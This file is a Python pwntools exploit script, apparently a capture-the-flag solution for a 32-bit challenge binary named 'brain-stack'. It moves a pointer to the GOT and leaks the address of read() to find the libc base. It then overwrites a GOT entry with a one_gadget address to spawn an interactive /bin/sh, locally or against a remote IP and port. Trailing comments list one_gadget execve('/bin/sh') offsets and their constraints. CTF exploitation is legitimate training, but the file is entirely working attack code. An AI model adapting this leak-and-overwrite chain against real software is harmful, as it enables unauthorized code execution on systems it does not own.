# coding:utf-8
from pwn import *
debug = 1
#context.log_level='debug'
elf = ELF('./brain-stack')
libc = ELF('./libc32')
if debug:
    p = process('./brain-stack',env={'LD_PRELOAD':'./libc32'})
#    libc=ELF('/home/moonagirl/moonagirl/libc/libc_local_x32')
#    gdb.attach(p)
else:
    p = remote('49.4.23.164', 32232)#  49.4.23.164 32232
    libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')
#    one_gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()
#.bss:56598040
#.got.plt:56598018

for i in range(0x56562040 - 0x5656200C):
	p.recvuntil('> ')
	p.sendline('<')
p.recvuntil('> ')
p.sendline('R')	
data = ''
data = p.recv(2) + data
data = p.recv(2) + data
data = p.recv(2) + data
data = p.recv(2) + data
read_addr = int(data,16)
success('read_addr:'+hex(read_addr))
libc_base = read_addr - libc.symbols['read']
success('libc_base:'+hex(libc_base))
system = libc_base + libc.symbols['system']
success('system:'+hex(system))
one_gadget = libc_base + 0x3a80e
success('one_gadget:'+hex(one_gadget))
for i in range(0x5658C018 - 0x5658C00C):
	p.recvuntil('> ')
	p.sendline('>')
#z()
p.recvuntil('> ')
p.sendline('W')
p.send(p32(one_gadget))
# p.recvuntil('> ')
# p.send('W')
p.interactive()
# 0x3ac5c	execve("/bin/sh", esp+0x28, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x28] == NULL

# 0x3ac5e	execve("/bin/sh", esp+0x2c, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x2c] == NULL

# 0x3ac62	execve("/bin/sh", esp+0x30, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x30] == NULL

# 0x3ac69	execve("/bin/sh", esp+0x34, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x34] == NULL

# 0x5fbc5	execl("/bin/sh", eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

# 0x5fbc6	execl("/bin/sh", [esp])
# constraints:
#   esi is the GOT address of libc
#   [esp] == NULL


# 0x3a80c	execve("/bin/sh", esp+0x28, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x28] == NULL

# 0x3a80e	execve("/bin/sh", esp+0x2c, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x2c] == NULL

# 0x3a812	execve("/bin/sh", esp+0x30, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x30] == NULL

# 0x3a819	execve("/bin/sh", esp+0x34, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x34] == NULL

# 0x5f065	execl("/bin/sh", eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

# 0x5f066	execl("/bin/sh", [esp])
# constraints:
#   esi is the GOT address of libc
#   [esp] == NULL
